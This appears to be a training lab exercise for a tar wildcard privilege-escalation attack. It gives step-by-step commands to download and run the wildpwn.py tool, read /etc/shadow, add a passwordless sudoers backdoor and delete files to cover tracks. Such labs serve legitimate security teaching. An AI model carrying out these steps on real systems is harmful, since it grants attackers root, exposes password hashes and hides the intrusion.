## Exploiting `tar`

In this exercise, you'll play the part of a penetration tester hunting for vulnerabilities in a target system's backup procedures.

- You'll use the `wildpwn.py` tool to verify that the system's current configuration is indeed vulnerable to this kind of privilege escalation attack.

- Then, you'll research and suggest two mitigation strategies to protect the server in the future.

### Instructions

1. Using the following credentials, log in as `jane` and use `sudo -l` to verify that you have no `sudo` rights:

    - Username: `jane`
    - password: `password`

    - Run `su jane`. Use `password` as the password.
    - Run `sudo -l` to confirm that you do not have **super user** privileges.


2. Next, we'll look for automated `tar` backup files that can be exploited. 
  - As `jane`, run `cd ~/Documents`

  - Run `ls -l` to display the archive file, `jane_docs_backup.tar`.

3. Download the [wildpwn.py](https://raw.githubusercontent.com/localh0t/wildpwn/master/wildpwn.py) attack tool to your `~/Documents/ExploitTar` directory. Do this from the command line, not the browser.

   - `cd ~/Documents/ExploitTar`

   - `wget https://raw.githubusercontent.com/localh0t/wildpwn/master/wildpwn.py`


4. Use `wildpwn.py` to generate the malicious `tar` payload files within the `/home/jane/Documents/ExploitTar` directory, which is expected to be frequently backed up.

    - Within the `ExploitTar` directory, run `python wildpwn.py tar .` 
    

    -  Run `ls -lat` to display our new payload files

5. Now we wait. 

    - After waiting a minute or two, re-run the `ls` command but with the proper options to see the new hidden subdirectory. 
    
    - Navigate into that subdirectory and list its hidden file. This is the one you'll want to run to execute the `wildcard attack` exploit.

    - Run `ls -lat` 
    - Run `cd .cache` to navigate _into_ the `.cache` directory
    - Run `ls -lat` to display the hidden `.cachefile` exploit file. 
6. Time to run the exploit.  

    - While still in the hidden subdirectory, execute the hidden file within the terminal.

   - Run `./.cachefile`  

7. As `root`, make `jane` a superuser with `sudo` access.  

    - Add `jane` to `/etc/sudoers` by running `visudo`. This will allow our user `jane` to run commands with superuser privileges. Also, specify the `NOPASSWD` rule for this user.

     ```bash
     # User privilege specification
     root    ALL=(ALL:ALL) ALL
     ```

   - Under that `root` permission, add the following line and save the file:  

     ```bash
     jane   ALL=(ALL) NOPASSWD:ALL
 
   - This should allow us to run `sudo` commands as `jane` without having to enter a password.

    - If you're not sure how to do this, there is a similar user set up under `root`'s **specifications**.

8. Let's test the our new privileges and then cover our tracks. 

    - Run `su jane`  

    - Test your `sudo` permissions with:

        - `sudo -l`, and then

        - `sudo cat /etc/shadow` 

     - If you can see the contents of this file, you have successfully carried out a `tar wildcard attack`, turning `jane` into a superuser!

     - Due to how you edited the `visudo` entry above, you shouldn't need to enter your password for this command. Password-less `sudo` permissions allow attackers to rapidly execute elevated instructions on a target machine.

    - Remove the `ExploitTar` directory entirely to cover your tracks.

        - Run `rm -r ~/Documents/ExploitTar`


9. Congratulations! You have successfully executed what is known as a `tar wildcard attack`! This is a more discreet attack that can be carried out on Unix-based operating system with `tar` installed. 